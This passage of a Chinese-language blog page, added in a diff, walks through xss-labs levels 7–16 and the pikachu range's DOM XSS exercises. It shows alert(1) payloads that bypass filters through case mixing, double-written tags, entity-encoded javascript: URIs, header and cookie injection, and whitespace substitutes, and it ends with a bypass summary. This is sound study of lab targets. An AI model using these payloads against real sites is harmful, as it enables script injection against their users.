class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现并未全转为小写来区分大小写，直接大小写绕过即可,<strong>html对大小写不敏感</strong>。</p>
+<h3 id="level7-双写绕过"><a href="#level7-双写绕过" class="headerlink" title="level7 双写绕过"></a>level7 双写绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&lt;&gt;alert(1)&lt;/&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接替换script标签为空，尝试双写绕过。</p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="leve8-href字符实体可用"><a href="#leve8-href字符实体可用" class="headerlink" title="leve8 href字符实体可用"></a>leve8 href字符实体可用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">BR</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;scr_ipt&gt;alert(&#x27;1&#x27;)&lt;/scr_ipt&gt;&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level8.jpg</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现直接把输入插入了href属性中，想到可以尝试javascript伪协议，但是仍然被过滤。。没思路了，于是看了眼师傅的wp：</p>
+<blockquote>
+<p>这里要用到 href 属性的一个特性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p>
+</blockquote>
+<p>这里将i进行实体化，从而使得绕过替换。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr<span class="symbol">&amp;#105;</span>pt:alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="level9-伪造网站格式"><a href="#level9-伪造网站格式" class="headerlink" title="level9 伪造网站格式"></a>level9 伪造网站格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析源码发现只检测了其中只要含有该字段即可，于是：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr<span class="symbol">&amp;#105;</span>pt:alert(1) // http://</span><br></pre></td></tr></table></figure>
+
+<p>即可绕过。</p>
+<h3 id="level10-隐藏表单注入"><a href="#level10-隐藏表单注入" class="headerlink" title="level10 隐藏表单注入"></a>level10 隐藏表单注入</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27;.&#x27;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27;.&#x27;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27;.$str33.&#x27;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>源码中发现三个隐藏的标签，测试发现t_sort可以利用，</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">keyword</span>=test&amp;t_sort=&quot; <span class="attribute">onmouseover</span>=javascript:alert(1) <span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是发现不显示，因为后面的type属性值为hidden而导致的，尝试在前面添加一个type为空从而覆盖掉后面的hidden。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">keyword</span>=test&amp;t_sort=&quot; <span class="attribute">onmouseover</span>=javascript:alert(1)<span class="built_in"> type </span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level11-Referer-注入"><a href="#level11-Referer-注入" class="headerlink" title="level11 Referer 注入"></a>level11 Referer 注入</h3><p>ctrl+U查看源码发现：<br><code>&lt;input name=&quot;t_ref&quot;  value=&quot;http://xss-libs:6543/level10.php?keyword=test&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type%20%22&quot; type=&quot;hidden&quot;&gt;</code></p>
+<p>猜测是直接传的Referer的值，尝试修改请求头为上一题的payload。</p>
+<h3 id="level12-UA注入"><a href="#level12-UA注入" class="headerlink" title="level12 UA注入"></a>level12 UA注入</h3><p>和上一题一样，修改User-Agent请求头即可。</p>
+<h3 id="level13-Cookie注入"><a href="#level13-Cookie注入" class="headerlink" title="level13 Cookie注入"></a>level13 Cookie注入</h3><p>设置Cookie如下：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span><span class="operator">=</span><span class="string">&quot; onmouseover=javascript:alert(1) type &quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="level14-EXIF写xss"><a href="#level14-EXIF写xss" class="headerlink" title="level14 EXIF写xss"></a>level14 EXIF写xss</h3><p>好像是网站废弃了做不了。</p>
+<p>大概思路是原来网页会解析上传图片的EXIF信息并展示，本地修改之后上传即可触发xss。</p>
+<h3 id="level15-ng-include（类似文件包含）"><a href="#level15-ng-include（类似文件包含）" class="headerlink" title="level15 ng-include（类似文件包含）"></a>level15 ng-include（类似文件包含）</h3><p>刚进去就发现被自动传了参数?src&#x3D;1.gif，查看源码发现被注入到了这里：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;ng-include:1.gif&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+</blockquote>
+<p>类似于文件包含的东西，在同文件夹内写入恶意代码文件，然后包含即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>?src=&quot;1.html&quot;</code></p>
+<h3 id="level16-空格过滤"><a href="#level16-空格过滤" class="headerlink" title="level16 空格过滤"></a>level16 空格过滤</h3><p>输入上题payload，发现：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>&lt;a<span class="symbol">&amp;nbsp;</span>href=java<span class="symbol">&amp;nbsp;</span>:alert(1)&gt;111&lt;<span class="symbol">&amp;nbsp;</span>a&gt;<span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level16.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现空格，<code>script</code>标签，<code>/</code>,均被替换，尝试用<code>%0c</code>代替，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;svg%0conload=alert(1)&gt;`</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h2 id="pikachu上的DOM型xss分析（待续）"><a href="#pikachu上的DOM型xss分析（待续）" class="headerlink" title="pikachu上的DOM型xss分析（待续）"></a>pikachu上的DOM型xss分析（待续）</h2><p>预计要看看基础js了。</p>
+<h3 id="DOM-1"><a href="#DOM-1" class="headerlink" title="DOM 1"></a>DOM 1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>str是我们输入的内容，意思是把输入的内容插入到<code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;</code>这里面，这里只需要闭合前面的a标签然后就可以了。</p>
+<p>注释中给了两条payload，让我们带入看看：</p>
+<ol>
+<li><pre><code class="html">&lt;a href=&#39;&quot;&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;&quot;&#39;&gt;what do you see?&lt;/a&gt;
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   第一条的思路是先闭合a标签，逃逸出来之后再注入img标签的恶意代码即可触发。</span><br><span class="line"></span><br><span class="line">2. ```html</span><br><span class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;&#x27;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>&quot;&#x27;&gt;what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+第二条的思路则是直接再a标签中加入onclick方法并触发然后闭合。
+</code></pre>
+</li>
+</ol>
+<h3 id="DOM-2"><a href="#DOM-2" class="headerlink" title="DOM 2"></a>DOM 2</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>; <span class="comment">// 得到参数字符串</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]); <span class="comment">// 分割得到参数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//                        alert(xss);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;domxss()&#x27;</span>&gt;</span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>点击底部a标签时，会触发domxss()方法，最终渲染出一个新的a标签。<code>&lt;a href=&#39;&quot;+xss+&quot;&#39;&gt;就让往事都随风,都随风吧&lt;/a&gt;</code>仍然是需要闭合标签。</p>
+<h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>直接写恶意代码，登录管理员后台查看即会被触发。</p>
+<h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><p><code>&lt;body onload=&quot;alert(1)&quot;&gt;&lt;/body&gt;</code>绕过</p>
+<h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><p>原理同xss-labs的level3。<code>&#39; onmouseover=alert(1) &#39;</code>。</p>
+<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>单双引号均被替换。</p>
+<p><code>javascript:alert(1)</code>发现在a标签的href属性中，伪协议绕过。</p>
+<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>发现自己的输入被嵌到js代码中并执行了整段代码，尝试闭合并逃逸执行恶意代码。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobi&#x27;;alert(1);//</span><br></pre></td></tr></table></figure>
+
+<p>注入效果为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $ms=<span class="string">&#x27;kobi&#x27;</span>;<span class="title function_">alert</span>(<span class="number">1</span>);<span class="comment">//&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//            alert($ms);</span></span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功执行。</p>
+<h3 id="绕过思路总结"><a href="#绕过思路总结" class="headerlink" title="绕过思路总结"></a>绕过思路总结</h3><ol>
+<li>标签名大小写绕过。</li>
+<li>js伪协议。<code>&lt;a href=&quot;javascript:alert(1)&quot; &gt;click me&lt;/a&gt;</code>       &#x2F;&#x2F;a标签伪协议执行</li>
+<li>空格绕过，用<code>%0c</code>、<code>%09</code>、 <code>/**/</code>、<code>/</code>来代替之。</li>
+<li>eval绕过，<code>&lt;svg/onload=eval(&#39;ale&#39;+&#39;rt(1)&#39;)&gt;</code></li>
+<li>双写绕过<code>&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt;</code></li>
+<li>大小写绕过 </li>
+<li>href 属性的一个特性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。这里将i进行实体化，从而使得绕过替换。<code>javascr&amp;#105;pt:alert(1)</code></li>
+</ol>
+<p>更多姿势可参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zha0gongz1/p/12732356.html">绕过XSS过滤姿势总结 - zha0gongz1 - 博客园</a></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/web/xss/">XSS - CTF Wiki</a></p>
+<p><a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/xss/">XSS 攻击 - Hello CTF</a></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss">跨站点脚本 (XSS) - PortSwigger</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gao79135/p/18000487">CTF-Show-XSS系列 - 夏目^_^ - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/CTFSHOW-XSS/#Web316">CTFSHOW-XSS - Boogiepop Doesn’t Laugh</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/124747885">Pikachu靶场之XSS漏洞详解_pikachu xss-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62584974/article/details/124029430">ctfshow XSS漏洞web316-328_ctfshow web316-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jayq1/article/details/139523410">【CTF-Web】XSS漏洞学习笔记（附ctfshow web316-333题目）_ctf xss-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/elephantxiang/article/details/115102343">pikachu XSS Cross-Site Scripting（皮卡丘漏洞平台通关系列）_pikachu的xss过关-CSDN博客</a></p>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 y@7q</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
